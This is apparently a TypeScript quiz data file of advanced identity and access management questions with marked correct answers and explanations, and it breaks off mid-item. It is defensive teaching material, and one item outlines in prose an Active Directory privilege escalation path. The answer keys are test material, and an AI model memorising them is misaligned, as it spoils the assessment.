export interface QuestionOption {
  id: string;
  label: string; // 'A', 'B', 'C', 'D'
  text: string;
  isCorrect: boolean;
}

export interface QuestionItem {
  id: string;
  categoryId: 'iam' | 'network' | 'web' | 'crypto';
  category: string;
  difficulty: string;
  question: string;
  options: QuestionOption[];
  explanation: string;
}

/**
 * Normalizes question option IDs ('opt-a' .. 'opt-d') and labels ('A' .. 'D')
 * based on their array index. This standardizes all existing and future questions.
 */
export function normalizeQuestionOptions(q: QuestionItem): QuestionItem {
  const labels = ['A', 'B', 'C', 'D'];
  const ids = ['opt-a', 'opt-b', 'opt-c', 'opt-d'];

  return {
    ...q,
    options: q.options.map((opt, idx) => ({
      ...opt,
      id: ids[idx] || `opt-${idx}`,
      label: labels[idx] || String.fromCharCode(65 + idx)
    }))
  };
}

export const rawQuestionsData: QuestionItem[] = [
  // ==========================================
  // 25 HARD / ADVANCED IDENTITY & ACCESS MANAGEMENT QUESTIONS
  // Correct answers are naturally distributed across A, B, C, and D.
  // ==========================================

  // 1. Joiner-Mover-Leaver & Lifecycle Management -> Correct Answer: C
  {
    id: 'iam-1',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise employee transfers from the Finance team to the Engineering department. Months later, an internal auditor discovers the employee retains write permissions to the financial ledger system as well as full repository access in Git. An investigation reveals access had been directly assigned to the user object across multiple SaaS portals during their time in Finance rather than granted through centralized role-based group memberships linked to HR job codes. Which control directly prevents this condition?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Implement mandatory password changes upon internal job transfer.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Deploy a Privileged Access Management (PAM) vault for all Finance department credentials.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Enforce automated identity lifecycle management tied to HR status changes with role-based access recertification.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Restrict network access to the financial ledger system using subnet IP whitelisting.', isCorrect: false }
    ],
    explanation: 'Direct entitlement assignments bypass centralized lifecycle management. Integrating Identity Governance and Administration (IGA) with HR system triggers ensures that when an employee\'s job code changes (a Mover event), prior role-based group memberships and direct entitlements are automatically revoked or flagged for recertification.'
  },

  // 2. ABAC vs RBAC in Dynamic Environments -> Correct Answer: A
  {
    id: 'iam-2',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An organization needs an authorization system where access to sensitive medical records is granted only if the requester is an active physician, assigned to the patient\'s current care unit, accessing the system during their scheduled shift, and physically located within the hospital\'s geographic network range. Which access control paradigm natively supports evaluating these multi-factor dynamic contextual constraints in real-time?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Attribute-Based Access Control (ABAC) using policy engines evaluating dynamic subject, resource, and environmental attributes.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Mandatory Access Control (MAC) based strictly on Bell-LaPadula lattice sensitivity classifications.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Discretionary Access Control (DAC) managed via object-level Access Control Lists (ACLs).', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Role-Based Access Control (RBAC) with static hierarchical security group inheritance.', isCorrect: false }
    ],
    explanation: 'Attribute-Based Access Control (ABAC) evaluates boolean logic over dynamic attributes (subject, resource, action, and environment attributes like shift time, location, and care unit assignment) at request time. Traditional RBAC only evaluates static group/role assignments and cannot natively model complex runtime environmental context without exponential role explosion.'
  },

  // 3. Phishing-Resistant Authentication (FIDO2 / WebAuthn) -> Correct Answer: D
  {
    id: 'iam-3',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An attacker sets up a reverse-proxy adversary-in-the-middle (AitM) phishing platform targeting corporate users. When a user logs in via the phished portal, they supply their username, password, and a push notification / TOTP code from their authenticator app. The proxy intercepts these artifacts and successfully authenticates to the real identity provider, stealing the session token. Which authentication mechanism renders this AitM attack completely ineffective?',
    options: [
      { id: 'opt-a', label: 'A', text: 'SMS-based One-Time Passwords with 6-digit verification codes.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Time-based One-Time Passwords (TOTP) generated via an RFC 6238 mobile app.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Push notification MFA requiring the user to tap "Approve" on their smartphone.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'FIDO2 / WebAuthn hardware security keys using origin-bound cryptographic assertions.', isCorrect: true }
    ],
    explanation: 'FIDO2/WebAuthn assertions include the origin (domain name) bound by the browser during webauthn API calls. When the user interacts with the phishing site (e.g., fake-sso.com), the browser signs the challenge using the key credential bound to fake-sso.com, which the real identity provider (real-sso.com) rejects because the origin signature does not match. Push notifications, TOTP, and SMS lack cryptographically enforced origin binding and are susceptible to AitM relay.'
  },

  // 4. OAuth 2.0 vs OpenID Connect (OIDC) -> Correct Answer: B
  {
    id: 'iam-4',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'A developer builds a client application that requests an OAuth 2.0 authorization code grant from an Identity Provider. The developer receives an access_token and attempts to parse its payload directly to extract the user\'s full name, email address, and authentication timestamp to establish a user session. Why is relying solely on an OAuth 2.0 access token for authentication an architectural anti-pattern?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Access tokens must always be transmitted inside HTTP POST request body parameters rather than Authorization Bearer headers.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'OAuth 2.0 is strictly a delegated authorization framework; access tokens convey permissions for an API client and are opaque to the client, whereas OpenID Connect (OIDC) explicitly provides an ID Token designed for user authentication.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'OAuth 2.0 access tokens cannot be encrypted or digitally signed using JSON Web Signatures (JWS).', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Access tokens are restricted to single-use interactions and expire immediately upon issuance.', isCorrect: false }
    ],
    explanation: 'OAuth 2.0 is an authorization framework meant to give a client app permission to access API resources on behalf of a resource owner. It makes no guarantees about user identity presentation or token format to the client. OpenID Connect (OIDC) extends OAuth 2.0 by introducing the id_token (a JWT containing user identity claims) specifically designed for authenticating the end-user to the client application.'
  },

  // 5. MFA Fatigue & Push Notification Abuse -> Correct Answer: B
  {
    id: 'iam-5',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'In a high-profile intrusion, adversaries obtained valid domain user credentials and triggered over 40 consecutive push-notification MFA requests to the target executive\'s mobile device at 2:00 AM until the executive tapped "Approve" out of frustration. Which immediate policy configuration directly counters this specific attack vector without replacing the push notification mechanism entirely?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Shortening the domain account password expiration window to 15 days.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Enforcing number matching and displaying login request location/context on push notification prompts.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Disabling IP address logging on the identity provider gateway.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Allowing users to register an unlimited number of secondary mobile backup devices.', isCorrect: false }
    ],
    explanation: 'MFA fatigue (push spam) exploits user prompt exhaustion. Requiring number matching forces the user to enter a multi-digit number shown on the login screen into their authenticator app, ensuring physical presence and visual alignment with the login attempt. Showing request geolocation and app context further empowers the user to recognize illegitimate prompts.'
  },

  // 6. Cloud IAM Cross-Account Access & Confused Deputy -> Correct Answer: D
  {
    id: 'iam-6',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'A SaaS vendor provides a cloud monitoring tool that requires read-only access to customer cloud accounts. The vendor asks customers to create a cross-account IAM Role that trusts the vendor\'s cloud account ID. To prevent the "confused deputy" problem—where another vendor customer tricks the vendor into accessing a target customer\'s account—which condition must be included in the IAM Role trust policy?',
    options: [
      { id: 'opt-a', label: 'A', text: 'An IP address condition restricting requests to the customer\'s corporate egress IP.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'A secret key embedded directly within the role\'s inline permission policy.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'A static root account password shared via encrypted email between customer and vendor.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'An External ID condition with a unique, unguessable secret string generated specifically for each customer tenant.', isCorrect: true }
    ],
    explanation: 'In cross-account role delegation to third-party multi-tenant SaaS providers, the confused deputy vulnerability occurs if Tenant A provides Tenant B\'s target role ARN to the SaaS provider. The SaaS provider would assume Tenant B\'s role using its own principal identity. Including an External ID condition generated uniquely for Tenant B ensures the SaaS provider passes Tenant B\'s secret ID when calling AssumeRole, preventing cross-tenant impersonation.'
  },

  // 7. SAML 2.0 Security & Signature Wrapping -> Correct Answer: A
  {
    id: 'iam-7',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An organization configures SAML 2.0 Single Sign-On between an On-Premises Identity Provider (IdP) and a SaaS Service Provider (SP). Security testing reveals that an attacker who intercepts a valid SAML Response XML document can tamper with the user email attribute inside the <Assertion> element and successfully authenticate as an enterprise administrator to the SP. Which design flaw allowed this assertion spoofing?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The Service Provider was configured to validate only the outer SAML Response signature rather than verifying the signature on the inner <Assertion> element itself, allowing XML Signature Wrapping (XSW) manipulation.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'The SAML metadata exchange utilized HTTP instead of raw TCP socket communication.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The Service Provider failed to mandate TLS 1.3 encryption on outbound DNS queries.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The IdP clock drift tolerance was set strictly to zero seconds.', isCorrect: false }
    ],
    explanation: 'In SAML 2.0, the <samlp:Response> and the contained <saml:Assertion> can be signed independently. If a Service Provider verifies the signature of the outer <Response> but allows an unsigned or weakly validated inner <Assertion> element to override user attributes (such as in XML Signature Wrapping - XSW attacks), attackers can manipulate assertions without invalidating the response envelope. The SP must validate signatures directly on the <Assertion> element.'
  },

  // 8. Zero Trust & Continuous Access Evaluation -> Correct Answer: C
  {
    id: 'iam-8',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'Under a mature Zero Trust architecture, an employee authenticates successfully at 9:00 AM from a managed corporate laptop. At 11:30 AM, while maintaining an active web session, the endpoint\'s EDR agent detects an unpatched high-severity malware execution and revokes the device\'s "Compliant" status. How should a Zero Trust Identity & Access control system respond?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Allow the active session to continue until the next scheduled 24-hour password change interval.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Log a security alert in the SIEM but permit uninterrupted application access until session token expiration in 8 hours.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Trigger Continuous Access Evaluation (CAE) signal processing to immediately revoke active access tokens and force re-authentication or device remediation.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Automatically assign the user to a Domain Admin group to facilitate remote endpoint remediation.', isCorrect: false }
    ],
    explanation: 'Zero Trust shifts from static point-in-time perimeter authentication to continuous verification. Continuous Access Evaluation (CAE) and real-time risk signal exchange (e.g., Shared Signals and Events / SSF) allow the identity provider and SaaS application to intercept device compliance changes mid-session, invalidating tokens or requiring immediate step-up/remediation rather than waiting for token expiration.'
  },

  // 9. PAM / Just-In-Time (JIT) & Just-Enough-Access (JEA) -> Correct Answer: A
  {
    id: 'iam-9',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise infrastructure team wants to eliminate permanent standing administrative privileges on production domain controllers. Administrators currently belong to the static Domain Admins group 24/7. Which combination of PAM architectural principles BEST achieves minimal standing privilege?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Just-In-Time (JIT) elevation with time-bound ephemeral group membership paired with Just-Enough-Access (JEA) constrained RBAC session scopes.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Granting permanent full domain admin rights to individual personal accounts while forcing 60-character passwords.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Storing a single shared Administrator password in a secure spreadsheet accessible to on-call staff.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Disabling administrative logging on domain controllers during routine maintenance windows.', isCorrect: false }
    ],
    explanation: 'Just-In-Time (JIT) access grants elevated permissions dynamically for a limited time window upon approval and revokes them automatically afterward, eliminating standing access. Just-Enough-Access (JEA) restricts administrative session capabilities to only the specific commands or RBAC scope needed for the task, adhering to least privilege.'
  },

  // 10. OAuth 2.0 Access Token Storage & Security in SPAs -> Correct Answer: D
  {
    id: 'iam-10',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'A single-page web application (SPA) receives an OAuth 2.0 access token and refresh token upon user login. Storing these tokens in browser localStorage or sessionStorage exposes them to theft via Cross-Site Scripting (XSS) vulnerabilities. Which client-side token management architecture provides the strongest protection against token theft via XSS?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Encoding the access token as a Base64 string before saving it in localStorage.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Writing tokens directly into global window JavaScript variables.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Appending refresh tokens as URL query parameters during page navigation.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Utilizing the Backend-for-Frontend (BFF) pattern where tokens are stored in server-side session memory and communicated via HttpOnly, Secure, SameSite cookies.', isCorrect: true }
    ],
    explanation: 'Browser storage (localStorage/sessionStorage) and global JS variables are accessible to any JavaScript running in the page DOM, making them vulnerable to XSS exfiltration. In the Backend-for-Frontend (BFF) architecture, the backend server handles token exchange and stores actual OAuth tokens server-side, issuing HttpOnly, Secure, SameSite session cookies to the browser. JavaScript running in the DOM cannot read HttpOnly cookies.'
  },

  // 11. Service Accounts & Hardcoded Credentials -> Correct Answer: C
  {
    id: 'iam-11',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An incident responder analyzes a breach where an attacker gained unrestricted administrative access to cloud production databases. The attacker did not compromise any employee passwords or bypass MFA. Forensic inspection revealed an open public GitHub repository contained an application source code file with hardcoded cloud IAM access keys belonging to a legacy deployment service account. What control failure directly facilitated this breach, and what is the remediation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Failure to enforce 14-day password rotation on user accounts; force all employees to pick new passwords.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Absence of SMS MFA on the developer\'s personal GitHub account; enable SMS verification.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Use of static, long-lived hardcoded API credentials instead of automated secret scanning, short-lived IAM roles, and Workload Identity Federation.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Failure to encrypt client-side JavaScript files using obfuscation tools before pushing to Git.', isCorrect: false }
    ],
    explanation: 'Static long-lived access keys embedded in code repositories are one of the leading causes of cloud compromises. Remediation requires deploying automated secret scanning in build pipelines, revoking static keys, and adopting Workload Identity Federation / OIDC-based short-lived tokens so workloads assume cloud roles without embedding static credentials.'
  },

  // 12. OAuth 2.0 PKCE Extension -> Correct Answer: B
  {
    id: 'iam-12',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'Why is the Proof Key for Code Exchange (PKCE, RFC 7636) extension strongly mandated for public OAuth 2.0 clients (such as native mobile apps and single-page apps), and how does it prevent authorization code interception attacks?',
    options: [
      { id: 'opt-a', label: 'A', text: 'PKCE encrypts the entire user payload with AES-256 before sending the request to the identity provider.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The client generates a secret code_verifier and sends its SHA-256 hash (code_challenge) in the initial request; during token exchange, presenting the code_verifier proves the requester is the identical client that initiated the flow.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'PKCE replaces the requirement for HTTPS transport security during token exchange.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'PKCE delegates authorization decision-making directly to local client device operating system kernels.', isCorrect: false }
    ],
    explanation: 'Public clients cannot keep client secrets confidential. In authorization code interception attacks, a malicious app registered with the same custom URI scheme on a mobile device might intercept the returned authorization code. With PKCE, the authorization server records the code_challenge. When exchanging the authorization code, only the legitimate client possessing the original code_verifier can derive the matching challenge, thwarting code interception by unauthorized apps.'
  },

  // 13. Active Directory / Cloud Privilege Escalation via DACL -> Correct Answer: A
  {
    id: 'iam-13',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'During an internal penetration test, an auditor discovers a low-privileged user account that possesses WriteDacl or GenericAll permissions over an Active Directory security group called Helpdesk-Admins. Members of Helpdesk-Admins have ForceChangePassword rights over Domain Admin accounts. How can the low-privileged attacker exploit this identity path to achieve full Domain Admin compromise?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Modify the DACL of Helpdesk-Admins to add their own account to the group, then reset a Domain Admin\'s password using the newly inherited permissions.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Reconfigure the domain controller DNS records to point to a rogue Kerberos key distribution center.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Execute a Golden Ticket attack by inspecting local browser cookies on the workstation.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Send an anonymous HTTP request to the Kerberos port to dump domain hashes.', isCorrect: false }
    ],
    explanation: 'In identity graph relationships (such as Active Directory DACLs or Cloud IAM policy hierarchies), possessing WriteDacl or GenericAll rights on a group object permits the principal to alter the group\'s Access Control List. The attacker can grant themselves membership in Helpdesk-Admins, inheriting its permissions to force password resets on Domain Admins. Identity Security Posture Management (ISPM) and graph-style path analysis identify and break these delegated privilege escalation loops.'
  },

  // 14. Passkeys & WebAuthn Security Tradeoffs -> Correct Answer: C
  {
    id: 'iam-14',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise evaluates replacing legacy passwords with FIDO2 / WebAuthn passkeys across employee workstations. When comparing single-device passkeys (hardware security keys like YubiKeys) with multi-device passkeys (synced via consumer cloud keychain backends), what primary security tradeoff must identity architects account for in enterprise environments?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Multi-device passkeys do not support public-key cryptography and rely on symmetric shared secrets.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Single-device passkeys cannot perform cryptographic signing during WebAuthn ceremonies.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Multi-device passkeys sync private key pairs across personal user devices via cloud platforms, increasing exposure if consumer accounts are compromised, whereas single-device passkeys keep private keys non-exportable within hardware security chips.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Single-device passkeys require an active internet connection to evaluate local PIN codes.', isCorrect: false }
    ],
    explanation: 'Both single-device and multi-device passkeys use public-key cryptography (WebAuthn). Single-device passkeys store the private key inside a tamper-resistant hardware security module (e.g., TPM or YubiKey) from which it can never be exported. Multi-device passkeys sync private keys across a user\'s ecosystem (e.g., Apple iCloud Keychain or Google Password Manager), offering greater user convenience but introducing enterprise risk if personal cloud accounts are compromised or unauthorized devices sync corporate credentials.'
  },

  // 15. JWT Token Revocation & Short Lifetimes -> Correct Answer: A
  {
    id: 'iam-15',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'A microservices platform uses stateless JSON Web Tokens (JWTs) signed with RSA-256 for user authorization. A security incident requires immediately terminating an active user\'s access across all downstream microservices. Because microservices validate JWTs statelessly using the IdP\'s public key without checking a central database, how can immediate revocation be effectively enforced?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Maintain short access token lifetimes (5–15 minutes) combined with an event-driven token revocation list / bloom filter at API gateways for emergency revocations.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Instruct microservices to parse the JWT alg header and switch signature algorithm to "none".', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Force the user to change their client-side IP address to invalidate the signature.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Store the RSA private key on every downstream microservice to re-sign tokens dynamically.', isCorrect: false }
    ],
    explanation: 'The primary tradeoff of stateless JWT verification is that a service cannot instantly know if a token was revoked before its exp timestamp without querying a central state. To minimize the window of exposure, best practice dictates using very short-lived access tokens (e.g., 5-15 minutes) alongside an event-driven revocation signal (e.g., Redis blacklisting or token introspection at API gateways for high-risk events).'
  },

  // 16. Emergency Access / Break-Glass Accounts -> Correct Answer: D
  {
    id: 'iam-16',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An organization establishes "break-glass" emergency administrative accounts in their primary cloud identity tenant to maintain access if federated identity providers or conditional access policies fail. Which set of controls represents security best practices for break-glass account management?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Assign break-glass accounts to personal employee emails, enable standard password resets, and exclude them from audit logs.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Use break-glass accounts for daily administrative operations to verify their functionality continuously.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Protect break-glass accounts with SMS-based MFA registered to the CEO\'s personal mobile phone.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Exclude break-glass accounts from conditional access rules that depend on external IdPs, secure high-entropy credentials in a monitored physical/digital vault, enforce hardware-based FIDO2 MFA, and trigger automated high-severity SIEM alerts upon any login attempt.', isCorrect: true }
    ],
    explanation: 'Emergency access (break-glass) accounts must remain functional even when main federated IdPs or conditional access policies suffer outages. Therefore, they are excluded from federated conditional access rules, but secured with extremely high-entropy passwords, hardware FIDO2 MFA, isolated cloud-native tenant domain names, and real-time SIEM alerts that notify security ops instantly whenever a break-glass login occurs.'
  },

  // 17. Cloud IAM Policy Evaluation Logic -> Correct Answer: B
  {
    id: 'iam-17',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'In a multi-account cloud environment, an IAM user has an attached identity policy explicitly allowing s3:GetObject on a target storage bucket. A Service Control Policy (SCP) at the Organizational Unit level contains an explicit Deny for s3:GetObject unless the request originates from a specific corporate IP range. The user attempts to download an object from an unauthorized home IP address. What is the outcome of the cloud IAM policy evaluation logic?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Access is granted because user-level explicit allow policies override organization-level SCPs.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Access is denied because an explicit Deny in any applicable policy (SCP, identity, or resource policy) automatically overrides all Allow statements.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Access is granted but an administrative warning email is dispatched to the SOC.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Access is deferred to a manual approval queue within the cloud management console.', isCorrect: false }
    ],
    explanation: 'Cloud IAM policy evaluation follows a strict rule: Default Deny -> Any Explicit Deny wins over any Allow -> Explicit Allow required. An explicit Deny statement in an SCP, Permission Boundary, Resource Policy, or Identity Policy immediately halts evaluation and denies access, regardless of how many explicit Allow statements exist elsewhere.'
  },

  // 18. Orphaned Accounts & Identity Governance -> Correct Answer: A
  {
    id: 'iam-18',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'A corporate network experiences an unauthorized intrusion where adversaries authenticated using a domain account belonging to a system administrator who departed the company 18 months prior. The account remained active in Active Directory despite the employee\'s offboarding ticket being closed. What structural identity governance failure led to this "orphaned account" state?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Lack of automated reconciliation between HR employee termination records and directory user states, coupled with missing automated stale/dormant account disablement policies.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Failure to require 128-character complex passwords on domain administrator accounts.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Disabling Kerberos pre-authentication on user accounts across the entire enterprise.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Allowing non-administrative employees to view directory user object attributes.', isCorrect: false }
    ],
    explanation: 'Orphaned accounts occur when an identity remains active in target directories or SaaS applications after the associated human or business entity leaves the organization. Automated HR-to-directory reconciliation ensures offboarding triggers immediate account deprovisioning. Automated stale account policies disable accounts inactive beyond a threshold (e.g., 30-60 days) as a safety net.'
  },

  // 19. OIDC ID Tokens & Signature Validation -> Correct Answer: C
  {
    id: 'iam-19',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An application authenticates a user using OpenID Connect (OIDC) Authorization Code Flow with PKCE. The client application receives an id_token and an access_token. To verify the integrity and authenticity of the received id_token before creating a local user session, which cryptographic check must the client perform?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Send the id_token to the DNS root server for reverse PTR validation.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Decrypt the id_token using the client application\'s local database password.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Validate the JWS signature using the issuer\'s public key published at the IdP\'s JSON Web Key Set (jwks_uri), and verify the iss, aud, and exp claims.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Re-encode the id_token using SHA-1 and compare it against the client ID string.', isCorrect: false }
    ],
    explanation: 'OIDC ID tokens are JSON Web Tokens (JWTs) signed by the Identity Provider. Before trusting claims inside an id_token, a client MUST fetch the IdP\'s public keys from its .well-known/openid-configuration jwks_uri, verify the cryptographic signature (JWS), and assert that: iss matches expected IdP issuer, aud matches the client\'s registered ID, and current time is before exp.'
  },

  // 20. PAM Credential Vaulting & Proxying -> Correct Answer: B
  {
    id: 'iam-20',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise implements a Privileged Access Management (PAM) solution for database administrators accessing production MySQL servers. Instead of granting DBAs direct MySQL credentials, DBAs connect through a PAM gateway proxy that injects dynamic session credentials without exposing the database root password to the DBA\'s workstation screen or memory. Which threat vector is directly mitigated by this design?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Distributed Denial of Service (DDoS) attacks against edge DNS resolvers.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Credential theft via keyloggers, screen scrapers, or memory dumping on administrator workstations.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'SQL injection vulnerabilities residing inside the application source code.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'BGP route hijacking of public IP prefixes.', isCorrect: false }
    ],
    explanation: 'By utilizing session proxying and credential vault injection, the administrator authenticates to the PAM portal (with strong MFA), and the PAM gateway opens the database connection using vaulted credentials. The actual database root credentials are never transmitted to or held in memory on the admin\'s endpoint, protecting them from workstation-based malware, keyloggers, and endpoint memory scrapers.'
  },

  // 21. Session Fixation & Remediation -> Correct Answer: D
  {
    id: 'iam-21',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'A security researcher demonstrates that an attacker can trick a victim into using an attacker-known session identifier cookie value prior to logging in. When the victim completes SSO authentication, the application server maintains the existing session ID rather than issuing a new session token, allowing the attacker to hijack the victim\'s authenticated session. What is this vulnerability called, and how is it remediated?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Cross-Site Request Forgery (CSRF); remediated by adding CAPTCHA to login forms.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'XML External Entity (XXE); remediated by disabling DTD processing in SAML parsers.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Server-Side Request Forgery (SSRF); remediated by blocking loopback IP ranges.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Session Fixation; remediated by invalidating pre-authentication session identifiers and regenerating a brand-new session token immediately upon successful user authentication.', isCorrect: true }
    ],
    explanation: 'Session Fixation occurs when an application preserves an unauthenticated session ID after authentication. The attacker fixes a session ID on the victim\'s browser (e.g., via URL parameter or sub-domain cookie manipulation) and waits for the victim to log in. Upon authentication, the server binds the victim\'s identity to the fixed session ID. To remediate, applications MUST invalidate pre-authentication session tokens and generate a fresh session ID upon login.'
  },

  // 22. Workload Identity Federation (M2M Security) -> Correct Answer: A
  {
    id: 'iam-22',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'A continuous deployment pipeline running on GitHub Actions needs to deploy containerized applications to AWS / Google Cloud. Historically, developers stored long-lived Cloud IAM access key secrets in GitHub repository settings. How does Workload Identity Federation (OIDC) improve security for this Machine-to-Machine (M2M) authentication flow?',
    options: [
      { id: 'opt-a', label: 'A', text: 'GitHub Actions requests a short-lived OIDC ID token signed by GitHub, which the cloud provider verifies against GitHub\'s public OIDC keys to issue temporary cloud IAM credentials without storing static cloud secrets in GitHub.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'GitHub Actions encrypts static cloud access keys using PGP keys before committing them directly to master branch code.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Cloud providers automatically grant root domain admin access to all GitHub repositories.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Developers enter their personal hardware security key PIN into GitHub Action job logs during build execution.', isCorrect: false }
    ],
    explanation: 'Workload Identity Federation eliminates the need to generate and store static, long-lived cloud service account keys in external CI/CD platforms. GitHub Actions issues a short-lived OIDC token containing repository context (sub, aud). The cloud IAM service validates this OIDC token against GitHub\'s issuer endpoint and trades it for temporary cloud credentials, achieving keyless authentication.'
  },

  // 23. Privilege Accumulation & Policy Resizing -> Correct Answer: C
  {
    id: 'iam-23',
    categoryId: 'iam',
